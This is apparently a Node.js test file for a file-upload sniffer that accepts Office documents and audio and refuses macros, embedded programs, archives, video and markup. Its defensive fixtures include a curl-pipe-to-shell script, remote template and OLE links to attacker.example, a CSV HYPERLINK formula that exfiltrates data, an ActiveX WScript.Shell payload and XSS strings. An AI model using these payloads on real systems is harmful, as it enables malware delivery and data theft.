/**
 * Chat-to-COP roadmap P1 (RT side): every file type a room can produce.
 *
 * - functions/api/_shared/document-sniff.ts types documents and audio from their bytes:
 *   Office Open XML and OpenDocument (central directory only, never decompressed),
 *   UTF-8 text, MP3/AAC/Ogg/FLAC/WAV/M4A; refuses macro-enabled Office, plain archives,
 *   video, programs, legacy OLE, markup and scripts.
 * - POST /api/cop/:id/uploads accepts them as download-only files
 *   (`metadata_removed: false`, served as application/octet-stream attachments);
 *   images still lose their metadata; anonymous drop forms still take only images/PDFs.
 * - `source_ref` on uploads is only silo:/peertube:; `evidence_id` attaches a cleared
 *   file to the bot's own card held pending a virus scan and lifts the hold.
 * - A file whose evidence is held is not served (409 to collaborators, 404 via shares);
 *   uploads are for collaborators, not every signed-in reader of a public session.
 *
 * Run: npm run test:unit
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { deflateRawSync } from 'node:zlib'
import {
  b64, cop, DROP_TOKEN, fixture as baseFixture, INTAKE_TOKEN, jpegWithMetadata, leaksMetadata, mod, publicCall, SESSION, setupInputSuite, SHARE_TOKEN,
} from './cop-input-harness.mjs'
import { JPEG_PLAIN } from './fixtures/images.mjs'
import { migration } from './cop-input-harness.mjs'

/** The input harness applies 0023; documents need 0025 on top. */
async function fixture(options = {}) {
  const made = await baseFixture(options)
  if (options.tags !== false) made.db.exec(migration('0025_cop_upload_documents.sql'))
  return made
}

setupInputSuite(['serviceAuth', 'copCaller', 'middleware', 'sanitize', 'uploads', 'upload', 'publicUpload', 'surveyUpload', 'intakeSubmit', 'submissions', 'copIngest'])

// ── Crafted fixtures ──────────────────────────────────────────────

const enc = (s) => new TextEncoder().encode(s)
const CRC_TABLE = (() => {
  const t = new Uint32Array(256)
  for (let n = 0; n < 256; n++) {
    let c = n
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
    t[n] = c >>> 0
  }
  return t
})()
function crc32(bytes) {
  let c = 0xffffffff
  for (const b of bytes) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8)
  return (c ^ 0xffffffff) >>> 0
}

/**
 * A real ZIP archive. Entries are stored, or deflated with `{ deflate: true }` (as
 * Office writes them), so the sniffer's inflate path is exercised too.
 */
function zip(entries, { comment = new Uint8Array() } = {}) {
  const locals = []
  const centrals = []
  let offset = 0
  for (const [name, content, options = {}] of entries) {
    const nameBytes = enc(name)
    const raw = typeof content === 'string' ? enc(content) : content
    const data = options.deflate ? new Uint8Array(deflateRawSync(raw)) : raw
    const method = options.deflate ? 8 : 0
    const crc = crc32(raw)
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 6); local.writeUInt16LE(method, 8)
    local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(raw.length, 22)
    local.writeUInt16LE(nameBytes.length, 26); local.writeUInt16LE(0, 28)
    const central = Buffer.alloc(46)
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(method, 10)
    central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(raw.length, 24)
    central.writeUInt16LE(nameBytes.length, 28); central.writeUInt32LE(offset, 42)
    locals.push(local, Buffer.from(nameBytes), Buffer.from(data))
    centrals.push(central, Buffer.from(nameBytes))
    offset += 30 + nameBytes.length + data.length
  }
  const cd = Buffer.concat(centrals)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16); eocd.writeUInt16LE(comment.length, 20)
  return new Uint8Array(Buffer.concat([...locals, cd, eocd, Buffer.from(comment)]))
}

const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
const DOCX = zip([['[Content_Types].xml', CT], ['_rels/.rels', '<Relationships/>'], ['word/document.xml', '<w:document/>'], ['docProps/core.xml', '<dc:creator>Alice</dc:creator>']])
const DOCM = zip([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>'], ['word/vbaProject.bin', new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 1, 2, 3])]])
const XLSX = zip([['[Content_Types].xml', CT], ['xl/workbook.xml', '<workbook/>']])
const PPTX = zip([['[Content_Types].xml', CT], ['ppt/presentation.xml', '<p:presentation/>']])
const ODT = zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<office:document-content/>'], ['META-INF/manifest.xml', '<manifest/>']])
const ODT_MACRO = zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Basic/Standard/Module1.xml', '<script/>']])
const PLAIN_ZIP = zip([['notes.txt', 'just a zip'], ['photo.jpg', new Uint8Array([0xff, 0xd8, 0xff])]])
const DOCX_WITH_EXE = zip([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>'], ['word/embeddings/run.exe', 'MZ']])

function box(type, payload) {
  const head = Buffer.alloc(8)
  head.writeUInt32BE(8 + payload.length, 0)
  head.write(type, 4, 'latin1')
  return Buffer.concat([head, Buffer.from(payload)])
}
const hdlr = (handler) => box('hdlr', Buffer.concat([Buffer.alloc(8), Buffer.from(handler, 'latin1'), Buffer.alloc(12)]))
const MP4_VIDEO = new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('isom\0\0\x02\0isommp41', 'latin1')), box('moov', Buffer.concat([hdlr('vide'), hdlr('soun')]))]))
const MP4_SOUND_ONLY = new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('mp42\0\0\0\0mp42isom', 'latin1')), box('moov', hdlr('soun'))]))
const M4A = new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('M4A \0\0\0\0M4A mp42', 'latin1')), box('moov', hdlr('soun'))]))
const MP3 = new Uint8Array([...enc('ID3'), 4, 0, 0, 0, 0, 0, 0, 0xff, 0xfb, 0x90, 0x64])
const MP3_FRAME = new Uint8Array([0xff, 0xfb, 0x90, 0x64, 0, 0, 0, 0])
const AAC = new Uint8Array([0xff, 0xf1, 0x50, 0x80, 0x02, 0x1f, 0xfc])
/** One Ogg page: header (27 bytes: capture, version, type, granule, serial, seq, crc, segments), segment table, data. */
const oggPage = (type, packet) => new Uint8Array([...enc('OggS'), 0, type, ...new Array(20).fill(0), 1, packet.length, ...packet])
const OPUS_HEAD = [...enc('OpusHead'), 1, 2, 0x38, 1, 0x80, 0xbb, 0, 0, 0, 0, 0]
const OGG_OPUS = new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(0, [...enc('OpusTags'), 0, 0, 0, 0])])
const OGG_THEORA = oggPage(2, [0x80, ...enc('theora'), 3, 2, 1])
const WAV = new Uint8Array([...enc('RIFF'), 36, 0, 0, 0, ...enc('WAVEfmt '), 16, 0, 0, 0, 1, 0, 1, 0, 0x44, 0xac, 0, 0, 0x88, 0x58, 1, 0, 2, 0, 16, 0, ...enc('data'), 0, 0, 0, 0])
const WEBM = new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0x9f, 0x42, 0x86, 0x81])
const EXE = new Uint8Array([...enc('MZ'), 0x90, 0, 3, 0, 0, 0, 4, 0])
const ELF = new Uint8Array([0x7f, ...enc('ELF'), 2, 1, 1, 0])
const OLE = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
const RAR = new Uint8Array([...enc('Rar!'), 0x1a, 7, 0])
const TEXT = enc('Notes from the north gate\nTwo vans, 14:05\n')
const TEXT_NUL = enc('hello\u0000world')
const SCRIPT = enc('#!/bin/sh\ncurl https://example.test | sh\n')
const MARKUP = enc('  <!doctype html><script>alert(1)</script>')
const PDF = enc('%PDF-1.7\n1 0 obj<</Author(Alice)>>endobj\n%%EOF\n')

const upload = (env, who, raw, { query = '', headers = {} } = {}) =>
  cop(env, 'POST', `/api/cop/${SESSION}/uploads${query}`, {
    who, raw, headers: { 'Content-Type': 'application/octet-stream', ...headers },
    handler: mod('uploads'), params: { id: SESSION },
  })
const getUpload = (env, who, id) =>
  cop(env, 'GET', `/api/cop/${SESSION}/uploads/${id}`, { who, handler: mod('upload'), params: { id: SESSION, uploadId: id } })

// ── Accepted types ────────────────────────────────────────────────

test('documents and audio are accepted as download-only files with their metadata flagged', async () => {
  const { db, env } = await fixture()
  const cases = [
    ['report.docx', DOCX, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'docx', 'document'],
    ['sheet.xlsx', XLSX, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xlsx', 'document'],
    ['deck.pptx', PPTX, 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'pptx', 'document'],
    ['notes.odt', ODT, 'application/vnd.oasis.opendocument.text', 'odt', 'document'],
    ['notes.txt', TEXT, 'text/plain', 'txt', 'document'],
    ['counts.csv', enc('a,b\n1,2\n'), 'text/csv', 'csv', 'document'],
    ['voice.mp3', MP3, 'audio/mpeg', 'mp3', 'audio'],
    ['frame.mp3', MP3_FRAME, 'audio/mpeg', 'mp3', 'audio'],
    ['voice.aac', AAC, 'audio/aac', 'aac', 'audio'],
    ['voice.ogg', OGG_OPUS, 'audio/ogg', 'ogg', 'audio'],
    ['voice.wav', WAV, 'audio/wav', 'wav', 'audio'],
    ['voice.m4a', M4A, 'audio/mp4', 'm4a', 'audio'],
    ['voice-note.mp4', MP4_SOUND_ONLY, 'audio/mp4', 'm4a', 'audio'],
  ]
  for (const [name, bytes, type, ext, kind] of cases) {
    const res = await upload(env, 'service', bytes, { query: '?evidence=1', headers: { 'X-File-Name': name } })
    assert.equal(res.status, 201, `${name}: ${await res.clone().text()}`)
    const body = await res.json()
    assert.equal(body.upload.content_type, type, name)
    assert.equal(body.upload.metadata_removed, false, name)
    const ev = db.prepare('SELECT evidence_type, description FROM evidence_items WHERE CAST(id AS TEXT) = ?').get(String(body.evidence.id))
    assert.equal(ev.evidence_type, kind, name)
    assert.match(ev.description, /metadata was not removed/, name)

    const served = await getUpload(env, 'owner', body.upload.id)
    assert.equal(served.status, 200, name)
    assert.equal(served.headers.get('Content-Type'), 'application/octet-stream', name)
    assert.equal(served.headers.get('Content-Disposition'), `attachment; filename="${body.upload.id}.${ext}"`, name)
    assert.equal(served.headers.get('X-Content-Type-Options'), 'nosniff')
    assert.equal(served.headers.get('Content-Security-Policy'), "default-src 'none'; sandbox")
    assert.deepEqual(new Uint8Array(await served.arrayBuffer()), bytes, `${name}: stored as uploaded`)
  }
})

test('images still lose their metadata and say so', async () => {
  const { env } = await fixture()
  const res = await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)))
  assert.equal(res.status, 201)
  const { upload: up } = await res.json()
  assert.equal(up.metadata_removed, true)
  const served = await getUpload(env, 'owner', up.id)
  assert.equal(served.headers.get('Content-Type'), 'image/jpeg')
  assert.equal(leaksMetadata(new Uint8Array(await served.arrayBuffer())), false)
})

// ── Refused types ─────────────────────────────────────────────────

test('macro-enabled Office, embedded programs, archives, video, programs and markup are refused', async () => {
  const { env, r2 } = await fixture()
  const cases = [
    ['macros.docm', DOCM, /macros, embedded objects or programs/],
    ['exe-inside.docx', DOCX_WITH_EXE, /macros, embedded objects or programs/],
    ['macro.odt', ODT_MACRO, /macros/],
    ['bundle.zip', PLAIN_ZIP, /archives can't be added/],
    ['clip.mp4', MP4_VIDEO, /videos can't be added/],
    ['clip.ogv', OGG_THEORA, /videos can't be added/],
    ['clip.webm', WEBM, /videos can't be added/],
    ['setup.exe', EXE, /programs can't be added/],
    ['tool', ELF, /programs can't be added/],
    ['old.doc', OLE, /old-style or password-protected Office/],
    ['bundle.rar', RAR, /archives can't be added/],
    ['bin.txt', TEXT_NUL, /this kind of file can't be added/],
    ['run.sh', SCRIPT, /scripts can't be added/],
    ['page.txt', MARKUP, /web pages and markup/],
  ]
  for (const [name, bytes, reason] of cases) {
    const res = await upload(env, 'owner', bytes, { headers: { 'X-File-Name': name } })
    assert.equal(res.status, 415, name)
    const body = await res.json()
    assert.equal(body.code, 'UNSUPPORTED_FILE', name)
    assert.match(body.error, reason, name)
  }
  assert.equal(r2.objects.size, 0, 'nothing refused reached storage')
})

test('anonymous evidence forms still take only images and PDFs', async () => {
  const { env, r2 } = await fixture()
  env.TURNSTILE_SECRET = 'set'
  env.BOT_INTAKE_API_KEY = 'bot-key-0000000000000000'
  for (const [name, bytes] of [['report.docx', DOCX], ['notes.txt', TEXT], ['voice.mp3', MP3]]) {
    const form = new FormData()
    form.append('files', new File([bytes], name, { type: 'application/octet-stream' }))
    const res = await publicCall(env, mod('surveyUpload'), 'POST', `/api/surveys/public/${DROP_TOKEN}/upload`, {
      raw: form, headers: { Authorization: 'Bearer bot-key-0000000000000000' }, params: { token: DROP_TOKEN },
    })
    assert.equal(res.status, 415, name)
  }
  assert.equal(r2.objects.size, 0)
})

// ── Archive references and held files ─────────────────────────────

test('uploads accept only silo:/peertube: references, and peertube only for the configured host', async () => {
  const { db, env } = await fixture({ channel: true })
  db.exec('ALTER TABLE evidence_items ADD COLUMN source_ref TEXT')
  const ok = await upload(env, 'service', TEXT, { query: '?evidence=1&source_ref=silo:4211' })
  assert.equal(ok.status, 201)
  const { evidence } = await ok.json()
  assert.equal(db.prepare('SELECT source_ref FROM evidence_items WHERE CAST(id AS TEXT) = ?').get(String(evidence.id)).source_ref, 'silo:4211')

  for (const ref of ['https://evil.example/x', 'silo:../../etc', 'silo:', 'javascript:alert(1)', 'peertube:https://video.example/w/1']) {
    const res = await upload(env, 'service', TEXT, { query: `?evidence=1&source_ref=${encodeURIComponent(ref)}` })
    assert.equal(res.status, 400, ref)
  }
  const withHost = { ...env, COP_PEERTUBE_HOST: 'video.example' }
  assert.equal((await upload(withHost, 'service', TEXT, { query: `?evidence=1&source_ref=${encodeURIComponent('peertube:https://video.example/w/abc')}` })).status, 201)
  assert.equal((await upload(withHost, 'service', TEXT, { query: `?evidence=1&source_ref=${encodeURIComponent('peertube:https://video.example.evil.test/w/abc')}` })).status, 400)
  assert.equal((await upload(withHost, 'service', TEXT, { query: `?evidence=1&source_ref=${encodeURIComponent('peertube:http://video.example/w/abc')}` })).status, 400)
})

test('a cleared file attaches to the bot\'s own held card and lifts the hold; not to anyone else\'s', async () => {
  const { db, env } = await fixture({ channel: true })
  db.exec(`INSERT INTO evidence_items (id, title, description, evidence_type, credibility, reliability, workspace_id, created_by, cop_session_id, metadata)
    VALUES (50, 'File posted in chat', 'held', 'document', 'unverified', 'unknown', 'ws-owner', 73, '${SESSION}', '{"scan_state":"pending"}'),
           (51, 'A person''s card', 'x', 'document', 'unverified', 'unknown', 'ws-owner', 1, '${SESSION}', '{"scan_state":"pending"}')`)
  const res = await upload(env, 'service', DOCX, { query: '?evidence_id=50', headers: { 'X-File-Name': 'report.docx' } })
  assert.equal(res.status, 201)
  const body = await res.json()
  assert.equal(String(body.evidence.id), '50')
  const ev = db.prepare('SELECT source_url, metadata FROM evidence_items WHERE id = 50').get()
  assert.equal(ev.source_url, body.upload.url)
  assert.equal(JSON.parse(ev.metadata).scan_state, 'clean')
  assert.equal(JSON.parse(ev.metadata).upload_id, body.upload.id)

  assert.equal((await upload(env, 'service', DOCX, { query: '?evidence_id=51' })).status, 403, 'not the bot\'s card')
  assert.equal((await upload(env, 'service', DOCX, { query: '?evidence_id=2' })).status, 404, 'another COP\'s evidence')
  assert.equal((await upload(env, 'service', DOCX, { query: '?evidence_id=x1' })).status, 400)
})

test('a file whose evidence is held is not served: 409 to collaborators, 404 through a share', async () => {
  const { db, env } = await fixture()
  const res = await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)), { query: '?evidence=1' })
  const { upload: up, evidence } = await res.json()
  assert.equal((await getUpload(env, 'owner', up.id)).status, 200)
  db.prepare('UPDATE evidence_items SET metadata = ? WHERE CAST(id AS TEXT) = ?').run('{"scan_state":"quarantined"}', String(evidence.id))
  const held = await getUpload(env, 'owner', up.id)
  assert.equal(held.status, 409)
  assert.equal((await held.json()).code, 'FILE_HELD')
  const shared = await publicCall(env, mod('publicUpload'), 'GET', `/api/cop/public/${SHARE_TOKEN}/uploads/${up.id}`, {
    params: { token: SHARE_TOKEN, uploadId: up.id },
  })
  assert.equal(shared.status, 404)
})

test('before migration 0025 a document is refused cleanly (415, nothing stored); images still work', async () => {
  const { env, r2 } = await baseFixture()
  const doc = await upload(env, 'owner', DOCX, { headers: { 'X-File-Name': 'report.docx' } })
  assert.equal(doc.status, 415)
  assert.match((await doc.json()).error, /not available on this server yet/)
  assert.equal(r2.objects.size, 0)
  assert.equal((await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)))).status, 201)
})

test('uploads are for the COP\'s own people, not every signed-in reader of a public session', async () => {
  const { db, env } = await fixture()
  const { upload: up } = await (await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)))).json()
  db.prepare('UPDATE cop_sessions SET is_public = 1 WHERE id = ?').run(SESSION)
  assert.equal((await getUpload(env, 'attacker', up.id)).status, 403, 'signed in, not on the COP')
  assert.equal((await getUpload(env, 'viewer', up.id)).status, 200, 'a viewer collaborator')
})

// ── Security review 2026-10-23 (reviewer's cases, scratchpad/rtp/cases.mjs) ──

const CT_MACRO = '<Types><Default Extension="dat" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'
const rels = (...items) => `<?xml version="1.0"?><Relationships>${items.join('')}</Relationships>`
const rel = (type, target, mode) => `<Relationship Id="r${Math.random().toString(36).slice(2, 6)}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${mode ? ` TargetMode="${mode}"` : ''}/>`
const docx = (...extra) => zip([['[Content_Types].xml', CT, { deflate: true }], ['word/document.xml', '<w:document/>', { deflate: true }], ...extra])
const FAKE_EOCD = new Uint8Array([0x50, 0x4b, 0x05, 0x06, ...new Array(18).fill(0)])
const id3 = (...rest) => new Uint8Array([...enc('ID3'), 4, 0, 0, 0, 0, 0, 0, ...rest])

test('reviewer cases: hidden macros, embedded objects, remote templates, ambiguous archives and disguised media are refused', async () => {
  const { env, r2 } = await fixture()
  const refused = [
    ['docm: vbaProject renamed to x.dat, macro-enabled content type (deflated)', zip([
      ['[Content_Types].xml', CT_MACRO, { deflate: true }], ['word/document.xml', '<w:document/>', { deflate: true }],
      ['word/_rels/document.xml.rels', '<Relationships><Relationship Id="r1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="x.dat"/></Relationships>', { deflate: true }],
      ['word/x.dat', OLE]])],
    ['vbaProject relationship alone', docx(['word/_rels/document.xml.rels', '<Relationships><Relationship Id="r1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="x.dat"/></Relationships>', { deflate: true }])],
    ['word\\vbaProject.bin (backslash path)', docx(['word\\vbaProject.bin', OLE])],
    ['OLE package word/embeddings/oleObject1.bin', docx(['word/embeddings/oleObject1.bin', OLE])],
    ['embedded macro-enabled workbook', docx(['word/embeddings/Microsoft_Excel_Macro-Enabled_Worksheet1.xlsm', 'PK'])],
    ['embedded macro-enabled template (.dotm)', docx(['word/embeddings/t.dotm', 'PK'])],
    ['remote template (attachedTemplate, External)', docx(['word/_rels/settings.xml.rels', rels(rel('attachedTemplate', 'https://attacker.example/t.dotm', 'External')), { deflate: true }])],
    ['remote OLE object (External)', docx(['word/_rels/document.xml.rels', rels(rel('oleObject', 'https://attacker.example/o.bin', 'External')), { deflate: true }])],
    ['remote frame (External)', docx(['word/_rels/webSettings.xml.rels', rels(rel('frame', 'https://attacker.example/f', 'External'))])],
    ['remote sub-document (External)', docx(['word/_rels/document.xml.rels', rels(rel('subDocument', 'https://attacker.example/s.docx', 'External'))])],
    ['OLE object content type', zip([['[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/></Types>', { deflate: true }], ['word/document.xml', '<w:document/>']])],
    ['ODT with macros inside an embedded object (Object 1/Basic/)', zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Object 1/Basic/Standard/Module1.xml', '<script/>']])],
    ['ODT with Scripts/', zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Scripts/python/run.py', 'import os']])],
    ['ambiguous ZIP: a second end-of-directory record in the comment', zip([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>']], { comment: FAKE_EOCD })],
    ['[Content_Types].xml inflating past 1 MB', zip([['[Content_Types].xml', '<Types>' + ' '.repeat(1_200_000) + '</Types>', { deflate: true }], ['word/document.xml', '<w:document/>']])],
    ['ID3 tag + MP4 video', id3(...enc('\0\0\0\x18ftypisom\0\0\x02\0isommp41'), ...enc('hdlr....vide'))],
    ['ID3 tag + HTML', id3(...enc('<html><script>alert(1)</script>'))],
    ['ID3 tag + program (MZ)', id3(...enc('MZ'), 0x90, 0)],
    ['M4A brand with a video track', new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('M4A \0\0\0\0M4A mp42', 'latin1')), box('moov', Buffer.concat([hdlr('soun'), hdlr('vide')]))]))],
    ['RIFF/WAVE header without a fmt chunk', enc('RIFF\x24\0\0\0WAVE<script>alert(1)</script>')],
    ['Ogg: an Opus stream and a Theora (video) stream', new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(2, [0x80, ...enc('theora'), 3, 2, 1])])],
    ['text: HTML after 2 KB of padding', enc('x'.repeat(2100) + '<html><script>alert(1)</script>')],
    ['text: <img onerror>', enc('<img src=x onerror=alert(1)>')],
    ['text: javascript: link', enc('click javascript:alert(1)')],
    ['text: RTF with an embedded object', enc('{\\rtf1\\ansi {\\object\\objemb}}')],
  ]
  for (const [name, bytes] of refused) {
    const res = await upload(env, 'owner', bytes, { headers: { 'X-File-Name': 'file' } })
    assert.equal(res.status, 415, `${name}: ${await res.clone().text()}`)
    assert.equal((await res.json()).code, 'UNSUPPORTED_FILE', name)
  }
  assert.equal(r2.objects.size, 0)
})

test('the same checks pass ordinary files: deflated docx with a hyperlink, MP3 after ID3, Ogg with two audio streams, plain JavaScript as text', async () => {
  const { env } = await fixture()
  const ordinary = docx(['word/_rels/document.xml.rels', rels(rel('hyperlink', 'https://news.example/a', 'External'), rel('styles', 'styles.xml')), { deflate: true }])
  const accepted = [
    ['report.docx', ordinary, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
    ['voice.mp3', MP3, 'audio/mpeg'],
    ['two.ogg', new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(2, [1, ...enc('vorbis'), 0, 0, 0, 0]), ...oggPage(0, [1, 2, 3])]), 'audio/ogg'],
    ['notes.txt', enc('var s = new ActiveXObject("WScript.Shell")\n'), 'text/plain'],
  ]
  for (const [name, bytes, type] of accepted) {
    const res = await upload(env, 'owner', bytes, { headers: { 'X-File-Name': name } })
    assert.equal(res.status, 201, `${name}: ${await res.clone().text()}`)
    assert.equal((await res.json()).upload.content_type, type, name)
  }
})

test('a CSV whose cells start like formulas is kept as text, so a spreadsheet won\'t evaluate it', async () => {
  const { env } = await fixture()
  const risky = await upload(env, 'owner', enc('name,link\nx,=HYPERLINK("https://attacker.example/?"&A2,"x")\n'), { headers: { 'X-File-Name': 'a.csv' } })
  const { upload: up } = await risky.json()
  assert.equal(up.content_type, 'text/plain')
  const served = await getUpload(env, 'owner', up.id)
  assert.match(served.headers.get('Content-Disposition'), /\.txt"$/)
  const plain = await upload(env, 'owner', enc('place,count\nGare du Nord,-12\nSaint-Denis,40\n'), { headers: { 'X-File-Name': 'b.csv' } })
  assert.equal((await plain.json()).upload.content_type, 'text/csv', 'negative numbers are not formulas')
})

test('an anonymous intake submission can\'t carry a document: refused at submit, and never filed as one on accept', async () => {
  const { db, env, r2 } = await fixture()
  const schema = JSON.stringify([{ name: 'note', type: 'textarea', label: 'Note' }, { name: 'attachment', type: 'file', label: 'Photo' }]).replace(/'/g, "''")
  db.exec(`UPDATE cop_intake_forms SET form_schema = '${schema}' WHERE id = 'intake-paris'`)
  db.exec(`INSERT INTO survey_drops (id, title, form_schema, share_token, status, intent, cop_session_id, workspace_id, created_by)
           VALUES ('intake-paris', 'Paris intake', '${schema}', 'legacy-copy-token', 'active', 'drop', '${SESSION}', 'ws-owner', 1)`)
  const payload = Buffer.from('var s=new ActiveXObject("WScript.Shell");s.Run("calc")\n').toString('base64')
  const before = db.prepare('SELECT COUNT(*) AS n FROM survey_responses').get().n
  const res = await publicCall(env, mod('intakeSubmit'), 'POST', `/api/cop/public/intake/${INTAKE_TOKEN}/submit`, {
    body: { form_data: { note: 'tip', attachment: `data:image/png;base64,${payload}` } }, params: { token: INTAKE_TOKEN },
  })
  assert.equal(res.status, 400, await res.clone().text())
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM survey_responses').get().n, before, 'nothing stored')

  // A row stored before the fix still can't become a document upload when accepted.
  db.prepare(`INSERT INTO survey_responses (id, survey_id, cop_session_id, form_data) VALUES ('sub-legacy', 'intake-paris', ?, ?)`)
    .run(SESSION, JSON.stringify({ note: 'tip', attachment: `data:image/png;base64,${payload}` }))
  const accept = await cop(env, 'PUT', `/api/cop/${SESSION}/submissions`, { who: 'owner', body: { id: 'sub-legacy', status: 'accepted' }, handler: mod('submissions'), params: { id: SESSION } })
  assert.ok(accept.status < 500, await accept.clone().text())
  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM cop_uploads WHERE source_channel = 'drop'").get().n, 0)
  assert.equal([...r2.objects.values()].filter((o) => o.httpMetadata?.contentType?.startsWith('text/')).length, 0)
})

test('per-file hold: attaching a new file retires the old one; held files 409; downloads are never cached', async () => {
  const { db, env } = await fixture()
  const first = await (await upload(env, 'owner', DOCX, { query: '?evidence=1', headers: { 'X-File-Name': 'a.docx' } })).json()
  const evidenceId = String(first.evidence.id)
  const served = await getUpload(env, 'owner', first.upload.id)
  assert.equal(served.status, 200)
  assert.equal(served.headers.get('Cache-Control'), 'no-store')

  const second = await (await upload(env, 'owner', XLSX, { query: `?evidence_id=${evidenceId}`, headers: { 'X-File-Name': 'b.xlsx' } })).json()
  assert.ok(db.prepare('SELECT archived_at FROM cop_uploads WHERE id = ?').get(first.upload.id).archived_at, 'the old file is archived')
  assert.equal((await getUpload(env, 'owner', first.upload.id)).status, 404, 'and no longer served')
  assert.equal((await getUpload(env, 'owner', second.upload.id)).status, 200)

  // An upload that is not the item's current file is never served, archived or not.
  db.prepare('UPDATE cop_uploads SET archived_at = NULL WHERE id = ?').run(first.upload.id)
  assert.equal((await getUpload(env, 'owner', first.upload.id)).status, 404)

  db.prepare("UPDATE evidence_items SET metadata = json_set(metadata, '$.scan_state', 'quarantined') WHERE CAST(id AS TEXT) = ?").run(evidenceId)
  assert.equal((await getUpload(env, 'owner', second.upload.id)).status, 409)

  const image = await (await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)))).json()
  assert.equal((await getUpload(env, 'owner', image.upload.id)).headers.get('Cache-Control'), 'private, max-age=3600')
})
